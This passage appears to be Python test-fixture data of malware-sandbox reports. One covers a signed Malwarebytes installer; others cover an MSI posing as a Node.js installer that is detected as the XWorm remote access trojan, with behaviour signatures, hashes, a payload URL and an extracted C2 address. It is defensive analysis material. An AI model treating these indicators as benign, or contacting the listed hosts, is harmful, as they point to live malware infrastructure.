                                "IMAGE_SCN_CNT_INITIALIZED_DATA",
                                "IMAGE_SCN_MEM_DISCARDABLE",
                                "IMAGE_SCN_MEM_READ",
                            ],
                        },
                    ],
                    "header": {
                        "entry_point": 455181,
                        "magic_number": 267,
                        "dll_characteristics": [
                            "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE",
                            "IMAGE_DLLCHARACTERISTICS_NX_COMPAT",
                            "IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE",
                        ],
                        "major_operating_system_version": 6,
                        "minor_operating_system_version": 0,
                        "subsystem": "IMAGE_SUBSYSTEM_WINDOWS_GUI",
                        "file_characteristics": ["IMAGE_FILE_EXECUTABLE_IMAGE", "IMAGE_FILE_32BIT_MACHINE"],
                        "pdb_paths": [
                            "C:\\Jenkins\\workspace\\MBAM-Windows\\A_MB5_MBSetup\\bin\\Win32\\Release\\MBSetup.pdb"
                        ],
                    },
                    "code_sign": {
                        "signers": [
                            {
                                "digest_algorithm": "sha256",
                                "actual_pe_digest": "30:b7:55:7a:3e:e4:00:de:eb:2a:ad:da:d6:53:94:30:67:1f:85:12:cf:65:c9:52:59:dc:ed:34:75:bc:8e:2c",
                                "pe_digests_matches": True,
                                "validity": {
                                    "trusted": False,
                                    "signature_validations": [
                                        {
                                            "signing_certificate": "CN=Malwarebytes Inc,O=Malwarebytes Inc,L=Santa Clara,ST=California,C=US",
                                            "verifications": [
                                                {
                                                    "is_valid": False,
                                                    "timestamp": "2024-06-27T14:36:31Z",
                                                    "chains": "null",
                                                }
                                            ],
                                        }
                                    ],
                                },
                            },
                            {
                                "digest_algorithm": "sha256",
                                "actual_pe_digest": "30:b7:55:7a:3e:e4:00:de:eb:2a:ad:da:d6:53:94:30:67:1f:85:12:cf:65:c9:52:59:dc:ed:34:75:bc:8e:2c",
                                "pe_digests_matches": True,
                                "validity": {
                                    "trusted": True,
                                    "signature_validations": [
                                        {
                                            "signing_certificate": "CN=Malwarebytes Inc.,O=Malwarebytes Inc.,ST=California,C=US",
                                            "verifications": [
                                                {
                                                    "is_valid": True,
                                                    "timestamp": "2024-06-27T14:35:46Z",
                                                    "chains": [
                                                        [
                                                            "CN=Malwarebytes Inc.,O=Malwarebytes Inc.,ST=California,C=US",
                                                            "CN=Sectigo RSA Code Signing CA 2,O=Sectigo Limited,C=GB",
                                                            "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                                        ]
                                                    ],
                                                }
                                            ],
                                        }
                                    ],
                                },
                            },
                        ],
                        "certificates": [
                            {
                                "issuer": "CN=Sectigo RSA Code Signing CA 2,O=Sectigo Limited,C=GB",
                                "subject": "CN=Malwarebytes Inc.,O=Malwarebytes Inc.,ST=California,C=US",
                                "not_before": "2022-03-23T00:00:00Z",
                                "not_after": "2025-03-16T23:59:59Z",
                                "serial_number": "a6:57:f7:78:b3:1a:e5:23:d6:67:13:17:18:d1:6e:b2",
                                "key_usages": ["KeyUsageDigitalSignature"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": ["http://crl.sectigo.com/SectigoRSACodeSigningCA2.crl"],
                            },
                            {
                                "issuer": "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                "subject": "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                "not_before": "2010-02-01T00:00:00Z",
                                "not_after": "2038-01-18T23:59:59Z",
                                "serial_number": "01:fd:6d:30:fc:a3:ca:51:a8:1b:bc:64:0e:35:03:2d",
                                "key_usages": ["KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                            },
                            {
                                "issuer": "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                "subject": "CN=Sectigo RSA Code Signing CA 2,O=Sectigo Limited,C=GB",
                                "not_before": "2021-05-25T00:00:00Z",
                                "not_after": "2036-05-24T23:59:59Z",
                                "serial_number": "9e:02:b0:e9:4a:ce:b2:10:9c:a1:e9:83:6b:e0:c2:db",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": ["http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl"],
                            },
                            {
                                "issuer": "CN=Sectigo RSA Time Stamping CA,O=Sectigo Limited,L=Salford,ST=Greater Manchester,C=GB",
                                "subject": "CN=Sectigo RSA Time Stamping Signer #4,O=Sectigo Limited,ST=Manchester,C=GB",
                                "not_before": "2023-05-03T00:00:00Z",
                                "not_after": "2034-08-02T23:59:59Z",
                                "serial_number": "39:4c:25:e1:7c:a0:6d:27:a8:65:e2:3b:d9:1d:22:d4",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageContentCommitment"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl.sectigo.com/SectigoRSATimeStampingCA.crl"],
                            },
                            {
                                "issuer": "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                "subject": "CN=Sectigo RSA Time Stamping CA,O=Sectigo Limited,L=Salford,ST=Greater Manchester,C=GB",
                                "not_before": "2019-05-02T00:00:00Z",
                                "not_after": "2038-01-18T23:59:59Z",
                                "serial_number": "30:0f:6f:ac:dd:66:98:74:7c:a9:46:36:a7:78:2d:b9",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl"],
                            },
                            {
                                "issuer": "CN=Microsoft Identity Verification Root Certificate Authority 2020,O=Microsoft Corporation,C=US",
                                "subject": "CN=Microsoft Identity Verification Root Certificate Authority 2020,O=Microsoft Corporation,C=US",
                                "not_before": "2020-04-16T18:36:16Z",
                                "not_after": "2045-04-16T18:44:40Z",
                                "serial_number": "54:98:d2:d1:d4:5b:19:95:48:13:79:c8:11:c0:87:99",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                            },
                            {
                                "issuer": "CN=Microsoft ID Verified CS AOC CA 01,O=Microsoft Corporation,C=US",
                                "subject": "CN=Malwarebytes Inc,O=Malwarebytes Inc,L=Santa Clara,ST=California,C=US",
                                "not_before": "2024-06-26T16:50:05Z",
                                "not_after": "2024-06-29T16:50:05Z",
                                "serial_number": "33:00:01:26:22:8f:41:36:d1:d2:1b:f2:3c:00:00:00:01:26:22",
                                "key_usages": ["KeyUsageDigitalSignature"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": [
                                    "http://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2001.crl"
                                ],
                            },
                            {
                                "issuer": "CN=Microsoft ID Verified CS AOC CA 01,O=Microsoft Corporation,C=US",
                                "subject": "CN=Malwarebytes Inc,O=Malwarebytes Inc,L=Santa Clara,ST=California,C=US",
                                "not_before": "2024-06-26T16:50:05Z",
                                "not_after": "2024-06-29T16:50:05Z",
                                "serial_number": "33:00:01:26:22:8f:41:36:d1:d2:1b:f2:3c:00:00:00:01:26:22",
                                "key_usages": ["KeyUsageDigitalSignature"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": [
                                    "http://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2001.crl"
                                ],
                            },
                            {
                                "issuer": "CN=Microsoft ID Verified Code Signing PCA 2021,O=Microsoft Corporation,C=US",
                                "subject": "CN=Microsoft ID Verified CS AOC CA 01,O=Microsoft Corporation,C=US",
                                "not_before": "2021-04-13T17:31:54Z",
                                "not_after": "2026-04-13T17:31:54Z",
                                "serial_number": "33:00:00:00:07:37:8c:5b:a1:d9:5b:8c:d4:00:00:00:00:00:07",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                                "cdps": [
                                    "http://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20Code%20Signing%20PCA%202021.crl"
                                ],
                            },
                            {
                                "issuer": "CN=Microsoft Identity Verification Root Certificate Authority 2020,O=Microsoft Corporation,C=US",
                                "subject": "CN=Microsoft ID Verified Code Signing PCA 2021,O=Microsoft Corporation,C=US",
                                "not_before": "2021-04-01T20:05:20Z",
                                "not_after": "2036-04-01T20:15:20Z",
                                "serial_number": "33:00:00:00:07:87:a3:34:a3:7b:a5:8e:1c:00:00:00:00:00:07",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                                "cdps": [
                                    "http://www.microsoft.com/pkiops/crl/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crl"
                                ],
                            },
                            {
                                "issuer": "CN=Sectigo RSA Time Stamping CA,O=Sectigo Limited,L=Salford,ST=Greater Manchester,C=GB",
                                "subject": "CN=Sectigo RSA Time Stamping Signer #4,O=Sectigo Limited,ST=Manchester,C=GB",
                                "not_before": "2023-05-03T00:00:00Z",
                                "not_after": "2034-08-02T23:59:59Z",
                                "serial_number": "39:4c:25:e1:7c:a0:6d:27:a8:65:e2:3b:d9:1d:22:d4",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageContentCommitment"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl.sectigo.com/SectigoRSATimeStampingCA.crl"],
                            },
                            {
                                "issuer": "CN=USERTrust RSA Certification Authority,O=The USERTRUST Network,L=Jersey City,ST=New Jersey,C=US",
                                "subject": "CN=Sectigo RSA Time Stamping CA,O=Sectigo Limited,L=Salford,ST=Greater Manchester,C=GB",
                                "not_before": "2019-05-02T00:00:00Z",
                                "not_after": "2038-01-18T23:59:59Z",
                                "serial_number": "30:0f:6f:ac:dd:66:98:74:7c:a9:46:36:a7:78:2d:b9",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl"],
                            },
                        ],
                    },
                    "imphash": "63ccd71a76a39a85385ce6d1810f26c1",
                    "subtype": {
                        "type": "generic",
                        "generic": {
                            "rich": [
                                {"count": 18, "version": 26213, "id": 259},
                                {"count": 186, "version": 26213, "id": 261},
                                {"count": 23, "version": 26706, "id": 259},
                                {"count": 37, "version": 26706, "id": 260},
                                {"count": 141, "version": 26706, "id": 261},
                                {"count": 28, "version": 26213, "id": 260},
                                {"count": 2, "version": 26213, "id": 262},
                                {"count": 13, "version": 26213, "id": 257},
                                {"count": 449, "productName": "Unmarked objects", "id": 1},
                                {"count": 35, "version": 27051, "id": 265},
                                {"count": 1, "version": 27051, "id": 255},
                                {"count": 2, "id": 151},
                                {"count": 1, "version": 27051, "id": 258},
                            ]
                        },
                    },
                }
            },
        }
    ],
    "unpack_count": 0,
    "error_count": 0,
}


query_241118_wj1z9asdqn = {
    "version": "0.3.0",
    "sample": {
        "id": "241118-wj1z9asdqn",
        "score": 10,
        "target": "node-v22.11.0-x64.msi",
        "size": 30289920,
        "md5": "fa9e1f3064a66913362e9bff7097cef5",
        "sha1": "b34f1f9a9f6242c54486a4bc453a9336840b4425",
        "sha256": "9eea480bd30c98ae11a97cb89a9278235cbbbd03c171ee5e5198bd86b7965b4b",
        "sha512": "ad3e9469326dccac6b49185b5b2814ba700b5d83b4b3ce17f85a9adc5f90bdebf54d79800b253ed5c371ab82d27304841f86ab1a8a3c7ffade8a2d78e55dc99f",
        "ssdeep": "786432:EtShU+9S49htlhk3tKuiU9IsO9IP1/lBMS8k4:EAUK/U9IN961/l",
        "created": "2024-11-18T17:57:50Z",
        "completed": "2024-11-18T18:00:27Z",
    },
    "tasks": [
        {
            "sample": "241118-wj1z9asdqn",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": [
                "family:xworm",
                "defense_evasion",
                "discovery",
                "execution",
                "persistence",
                "privilege_escalation",
                "rat",
                "trojan",
            ],
            "score": 10,
            "target": "node-v22.11.0-x64.msi",
            "backend": "sbx4m60",
            "resource": "win10v2004-20241007-en",
            "os": "windows10-2004-x64",
            "timeout": 150,
            "sigs": 28,
        },
        {"sample": "241118-wj1z9asdqn", "kind": "static", "name": "static1", "status": "reported", "score": 1},
    ],
    "analysis": {
        "score": 10,
        "family": ["xworm"],
        "tags": [
            "family:xworm",
            "defense_evasion",
            "discovery",
            "execution",
            "persistence",
            "privilege_escalation",
            "rat",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1"],
            "score": 10,
            "target": "node-v22.11.0-x64.msi",
            "size": 30289920,
            "md5": "fa9e1f3064a66913362e9bff7097cef5",
            "sha1": "b34f1f9a9f6242c54486a4bc453a9336840b4425",
            "sha256": "9eea480bd30c98ae11a97cb89a9278235cbbbd03c171ee5e5198bd86b7965b4b",
            "sha512": "ad3e9469326dccac6b49185b5b2814ba700b5d83b4b3ce17f85a9adc5f90bdebf54d79800b253ed5c371ab82d27304841f86ab1a8a3c7ffade8a2d78e55dc99f",
            "ssdeep": "786432:EtShU+9S49htlhk3tKuiU9IsO9IP1/lBMS8k4:EAUK/U9IN961/l",
            "tags": [
                "family:xworm",
                "defense_evasion",
                "discovery",
                "execution",
                "persistence",
                "privilege_escalation",
                "rat",
                "trojan",
            ],
            "family": ["xworm"],
            "signatures": [
                {
                    "name": "Detect Xworm Payload",
                    "score": 10,
                    "indicators": [
                        {
                            "resource": "behavioral1/memory/5108-2747-0x0000000000C10000-0x0000000000C28000-memory.dmp",
                            "yara_rule": "family_xworm",
                        },
                        {"resource": "behavioral1/files/0x000b0000000249d7-2790.dat", "yara_rule": "family_xworm"},
                    ],
                },
                {
                    "label": "xworm",
                    "name": "Xworm",
                    "score": 10,
                    "tags": ["trojan", "rat", "family:xworm"],
                    "desc": "Xworm is a remote access trojan written in C#.",
                },
                {"name": "Xworm family", "score": 10, "tags": ["family:xworm"]},
                {
                    "label": "powershell_hide",
                    "name": "Command and Scripting Interpreter: PowerShell",
                    "score": 8,
                    "ttp": ["T1059.001"],
                    "tags": ["execution"],
                    "desc": "Run Powershell and hide display window.",
                },
                {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
                {"name": "Blocklisted process makes network request", "score": 6},
                {
                    "label": "file_drive_discovery",
                    "name": "Enumerates connected drives",
                    "score": 6,
                    "ttp": ["T1012", "T1120", "T1082"],
                    "desc": "Attempts to read the root path of hard drives other than the default C: drive.",
                },
                {
                    "label": "powershell_hidden_window",
                    "name": "Hide Artifacts: Hidden Window",
                    "score": 6,
                    "ttp": ["T1564.003"],
                    "tags": ["defense_evasion"],
                    "desc": "Windows that would typically be displayed when an application carries out an operation can be hidden.",
                },
                {
                    "label": "external_ip_lookup",
                    "name": "Looks up external IP address via web service",
                    "score": 6,
                    "desc": "Uses a legitimate IP lookup service to find the infected system's external IP.",
                },
                {
                    "label": "reg_checks_country_code",
                    "name": "Checks computer location settings",
                    "score": 5,
                    "ttp": ["T1012", "T1082"],
                    "desc": "Looks up country code configured in the registry, likely geofence.",
                },
                {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
                {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
                {"name": "Executes dropped EXE", "score": 4},
                {"name": "Loads dropped DLL", "score": 4},
                {
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                },
                {
                    "label": "install_packages_msi",
                    "name": "Event Triggered Execution: Installer Packages",
                    "score": 3,
                    "ttp": ["T1546.016", "T1218.007"],
                    "tags": ["persistence", "privilege_escalation"],
                },
                {
                    "label": "system_language_discovery",
                    "name": "System Location Discovery: System Language Discovery",
                    "score": 3,
                    "ttp": ["T1614.001"],
                    "tags": ["discovery"],
                    "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
                },
                {
                    "label": "reg_system_enum",
                    "name": "Checks SCSI registry key(s)",
                    "ttp": ["T1012", "T1120", "T1082"],
                    "desc": "SCSI information is often read in order to detect sandboxing environments.",
                },
                {
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                },
                {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of FindShellTrayWindow"},
                {"name": "Suspicious use of SendNotifyMessage"},
                {"name": "Suspicious use of SetWindowsHookEx"},
                {"name": "Suspicious use of WriteProcessMemory"},
                {
                    "label": "win_volshadow_com_clsid",
                    "name": "Uses Volume Shadow Copy service COM API",
                    "tags": ["ransomware"],
                    "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
                },
            ],
            "iocs": {
                "urls": ["http://ip-api.com/line/?fields=hosting", "https://rentry.co/8wum7vax/raw"],
                "domains": [
                    "8.8.8.8.in-addr.arpa",
                    "28.118.140.52.in-addr.arpa",
                    "71.159.190.20.in-addr.arpa",
                    "240.221.184.93.in-addr.arpa",
                    "95.221.229.192.in-addr.arpa",
                    "97.17.167.52.in-addr.arpa",
                    "56.163.245.4.in-addr.arpa",
                    "57.110.18.2.in-addr.arpa",
                    "18.31.95.13.in-addr.arpa",
                    "172.214.232.199.in-addr.arpa",
                    "registry.npmjs.org",
                    "48.229.111.52.in-addr.arpa",
                    "34.29.16.104.in-addr.arpa",
                    "ip-api.com",
                    "1.112.95.208.in-addr.arpa",
                    "rentry.co",
                    "man-laughing.gl.at.ply.gg",
                    "16.3.26.104.in-addr.arpa",
                ],
                "ips": ["8.8.8.8", "104.16.29.34", "208.95.112.1", "104.26.3.16", "147.185.221.23"],
            },
        }
    ],
    "signatures": [
        {
            "name": "Detect Xworm Payload",
            "score": 10,
            "indicators": [
                {
                    "resource": "behavioral1/memory/5108-2747-0x0000000000C10000-0x0000000000C28000-memory.dmp",
                    "yara_rule": "family_xworm",
                },
                {"resource": "behavioral1/files/0x000b0000000249d7-2790.dat", "yara_rule": "family_xworm"},
            ],
        },
        {
            "label": "xworm",
            "name": "Xworm",
            "score": 10,
            "tags": ["trojan", "rat", "family:xworm"],
            "desc": "Xworm is a remote access trojan written in C#.",
        },
        {"name": "Xworm family", "score": 10, "tags": ["family:xworm"]},
        {
            "label": "powershell_hide",
            "name": "Command and Scripting Interpreter: PowerShell",
            "score": 8,
            "ttp": ["T1059.001"],
            "tags": ["execution"],
            "desc": "Run Powershell and hide display window.",
        },
        {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
        {"name": "Blocklisted process makes network request", "score": 6},
        {
            "label": "file_drive_discovery",
            "name": "Enumerates connected drives",
            "score": 6,
            "ttp": ["T1012", "T1120", "T1082"],
            "desc": "Attempts to read the root path of hard drives other than the default C: drive.",
        },
        {
            "label": "powershell_hidden_window",
            "name": "Hide Artifacts: Hidden Window",
            "score": 6,
            "ttp": ["T1564.003"],
            "tags": ["defense_evasion"],
            "desc": "Windows that would typically be displayed when an application carries out an operation can be hidden.",
        },
        {
            "label": "external_ip_lookup",
            "name": "Looks up external IP address via web service",
            "score": 6,
            "desc": "Uses a legitimate IP lookup service to find the infected system's external IP.",
        },
        {
            "label": "reg_checks_country_code",
            "name": "Checks computer location settings",
            "score": 5,
            "ttp": ["T1012", "T1082"],
            "desc": "Looks up country code configured in the registry, likely geofence.",
        },
        {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
        {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
        {"name": "Executes dropped EXE", "score": 4},
        {"name": "Loads dropped DLL", "score": 4},
        {
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
            "desc": "Attempts to interact with connected storage/optical drive(s).",
        },
        {
            "label": "install_packages_msi",
            "name": "Event Triggered Execution: Installer Packages",
            "score": 3,
            "ttp": ["T1546.016", "T1218.007"],
            "tags": ["persistence", "privilege_escalation"],
        },
        {
            "label": "system_language_discovery",
            "name": "System Location Discovery: System Language Discovery",
            "score": 3,
            "ttp": ["T1614.001"],
            "tags": ["discovery"],
            "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
        },
        {
            "label": "reg_system_enum",
            "name": "Checks SCSI registry key(s)",
            "ttp": ["T1012", "T1120", "T1082"],
            "desc": "SCSI information is often read in order to detect sandboxing environments.",
        },
        {
            "label": "reg_hw_processor",
            "name": "Checks processor information in registry",
            "ttp": ["T1012", "T1082"],
            "desc": "Processor information is often read in order to detect sandboxing environments.",
        },
        {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of FindShellTrayWindow"},
        {"name": "Suspicious use of SendNotifyMessage"},
        {"name": "Suspicious use of SetWindowsHookEx"},
        {"name": "Suspicious use of WriteProcessMemory"},
        {
            "label": "win_volshadow_com_clsid",
            "name": "Uses Volume Shadow Copy service COM API",
            "tags": ["ransomware"],
            "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
        },
    ],
    "extracted": [
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/5108-2747-0x0000000000C10000-0x0000000000C28000-memory.dmp",
            "resource": "behavioral1/memory/5108-2747-0x0000000000C10000-0x0000000000C28000-memory.dmp",
            "config": {
                "family": "xworm",
                "rule": "Xworm",
                "c2": ["man-laughing.gl.at.ply.gg:57783"],
                "attr": {"install_file": "Windows Data Compiler.exe", "Install_directory": "%LocalAppData%"},
            },
        }
    ],
}

query_241113_rawlystckq = {
    "version": "0.3.0",
    "sample": {
        "id": "241113-rawlystckq",
        "score": 10,
        "target": "node-v22.11.0-x64.msi",
        "size": 30289920,
        "md5": "fa9e1f3064a66913362e9bff7097cef5",
        "sha1": "b34f1f9a9f6242c54486a4bc453a9336840b4425",
        "sha256": "9eea480bd30c98ae11a97cb89a9278235cbbbd03c171ee5e5198bd86b7965b4b",
        "sha512": "ad3e9469326dccac6b49185b5b2814ba700b5d83b4b3ce17f85a9adc5f90bdebf54d79800b253ed5c371ab82d27304841f86ab1a8a3c7ffade8a2d78e55dc99f",
        "ssdeep": "786432:EtShU+9S49htlhk3tKuiU9IsO9IP1/lBMS8k4:EAUK/U9IN961/l",
        "created": "2024-11-13T13:59:55Z",
        "completed": "2024-11-13T14:05:10Z",
    },
    "tasks": [
        {
            "sample": "241113-rawlystckq",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["persistence", "privilege_escalation"],
            "score": 6,
            "target": "node-v22.11.0-x64.msi",
            "backend": "sbx4m64",
            "resource": "win7-20240903-en",
            "os": "windows7-x64",
            "timeout": 1200,
            "sigs": 4,
        },
        {
            "sample": "241113-rawlystckq",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": [
                "family:xworm",
                "defense_evasion",
                "discovery",
                "execution",
                "persistence",
                "privilege_escalation",
                "rat",
                "trojan",
            ],
            "score": 10,
            "target": "node-v22.11.0-x64.msi",
            "backend": "sbx4m62",
            "resource": "win10v2004-20241007-en",
            "os": "windows10-2004-x64",
            "timeout": 1200,
            "sigs": 31,
        },
        {"sample": "241113-rawlystckq", "kind": "static", "name": "static1", "status": "reported", "score": 1},
    ],
    "analysis": {
        "score": 10,
        "family": ["xworm"],
        "tags": [
            "family:xworm",
            "defense_evasion",
            "discovery",
            "execution",
            "persistence",
            "privilege_escalation",
            "rat",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "node-v22.11.0-x64.msi",
            "size": 30289920,
            "md5": "fa9e1f3064a66913362e9bff7097cef5",
            "sha1": "b34f1f9a9f6242c54486a4bc453a9336840b4425",
            "sha256": "9eea480bd30c98ae11a97cb89a9278235cbbbd03c171ee5e5198bd86b7965b4b",
            "sha512": "ad3e9469326dccac6b49185b5b2814ba700b5d83b4b3ce17f85a9adc5f90bdebf54d79800b253ed5c371ab82d27304841f86ab1a8a3c7ffade8a2d78e55dc99f",
            "ssdeep": "786432:EtShU+9S49htlhk3tKuiU9IsO9IP1/lBMS8k4:EAUK/U9IN961/l",
            "tags": [
                "persistence",
                "privilege_escalation",
                "family:xworm",
                "defense_evasion",
                "discovery",
                "execution",
                "rat",
                "trojan",
            ],
            "family": ["xworm"],
            "signatures": [
                {
                    "name": "Detect Xworm Payload",
                    "score": 10,
                    "indicators": [
                        {
                            "resource": "behavioral2/memory/3652-2770-0x0000000000D40000-0x0000000000D58000-memory.dmp",
                            "yara_rule": "family_xworm",
                        },
                        {"resource": "behavioral2/files/0x00080000000249a4-2785.dat", "yara_rule": "family_xworm"},
                        {
                            "resource": "behavioral2/memory/3200-2790-0x0000000000190000-0x00000000001A0000-memory.dmp",
                            "yara_rule": "family_xworm",
                        },
                        {"resource": "behavioral2/files/0x00080000000249a6-2805.dat", "yara_rule": "family_xworm"},
                        {
                            "resource": "behavioral2/memory/4636-2812-0x0000000000D00000-0x0000000000D12000-memory.dmp",
                            "yara_rule": "family_xworm",
                        },
                        {"resource": "behavioral2/files/0x000a0000000249a9-2944.dat", "yara_rule": "family_xworm"},
                    ],
                },
                {
                    "label": "xworm",
                    "name": "Xworm",
                    "score": 10,
                    "tags": ["trojan", "rat", "family:xworm"],
                    "desc": "Xworm is a remote access trojan written in C#.",
                },
                {"name": "Xworm family", "score": 10, "tags": ["family:xworm"]},
                {
                    "label": "powershell_hide",
                    "name": "Command and Scripting Interpreter: PowerShell",
                    "score": 8,
                    "ttp": ["T1059.001"],
                    "tags": ["execution"],
                    "desc": "Run Powershell and hide display window.",
                },
                {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
                {
                    "label": "creates_runkey_registry",
                    "name": "Adds Run key to start application",
                    "score": 6,
                    "ttp": ["T1547.001", "T1112"],
                    "tags": ["persistence"],
                },
                {
                    "label": "file_drive_discovery",
                    "name": "Enumerates connected drives",
                    "score": 6,
                    "ttp": ["T1012", "T1120", "T1082"],
                    "desc": "Attempts to read the root path of hard drives other than the default C: drive.",
                },
                {
                    "label": "powershell_hidden_window",
                    "name": "Hide Artifacts: Hidden Window",
                    "score": 6,
                    "ttp": ["T1564.003"],
                    "tags": ["defense_evasion"],
                    "desc": "Windows that would typically be displayed when an application carries out an operation can be hidden.",
                },
                {
                    "label": "external_ip_lookup",
                    "name": "Looks up external IP address via web service",
                    "score": 6,
                    "desc": "Uses a legitimate IP lookup service to find the infected system's external IP.",
                },
                {
                    "label": "reg_checks_country_code",
                    "name": "Checks computer location settings",
                    "score": 5,
                    "ttp": ["T1012", "T1082"],
                    "desc": "Looks up country code configured in the registry, likely geofence.",
                },
                {"label": "fw_system32", "name": "Drops file in System32 directory", "score": 5},
                {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
                {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
                {"name": "Executes dropped EXE", "score": 4},
                {"name": "Loads dropped DLL", "score": 4},
                {
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                },
                {
                    "label": "install_packages_msi",
                    "name": "Event Triggered Execution: Installer Packages",
                    "score": 3,
                    "ttp": ["T1546.016", "T1218.007"],
                    "tags": ["persistence", "privilege_escalation"],
                },
                {
                    "label": "system_language_discovery",
                    "name": "System Location Discovery: System Language Discovery",
                    "score": 3,
                    "ttp": ["T1614.001"],
                    "tags": ["discovery"],
                    "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
                },
                {
                    "label": "reg_system_enum",
                    "name": "Checks SCSI registry key(s)",
                    "ttp": ["T1012", "T1120", "T1082"],
                    "desc": "SCSI information is often read in order to detect sandboxing environments.",
                },
                {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {
                    "label": "schtasks_persist",
                    "name": "Scheduled Task/Job: Scheduled Task",
                    "ttp": ["T1053.005"],
                    "tags": ["persistence", "execution"],
                    "desc": "Schtasks is often used by malware for persistence or to perform post-infection execution.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: GetForegroundWindowSpam"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of FindShellTrayWindow"},
                {"name": "Suspicious use of SendNotifyMessage"},
                {"name": "Suspicious use of SetWindowsHookEx"},
                {"name": "Suspicious use of WriteProcessMemory"},
                {
                    "label": "win_tasksched_com_clsid",
                    "name": "Uses Task Scheduler COM API",
                    "ttp": ["T1012"],
                    "tags": ["persistence"],
                    "desc": "The Task Scheduler COM API can be used to schedule applications to run on boot or at set times.",
                },
                {
                    "label": "win_volshadow_com_clsid",
                    "name": "Uses Volume Shadow Copy service COM API",
                    "tags": ["ransomware"],
                    "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
                },
            ],
            "iocs": {
                "urls": ["http://ip-api.com/line/?fields=hosting", "https://rentry.co/8wum7vax/raw"],
                "domains": [
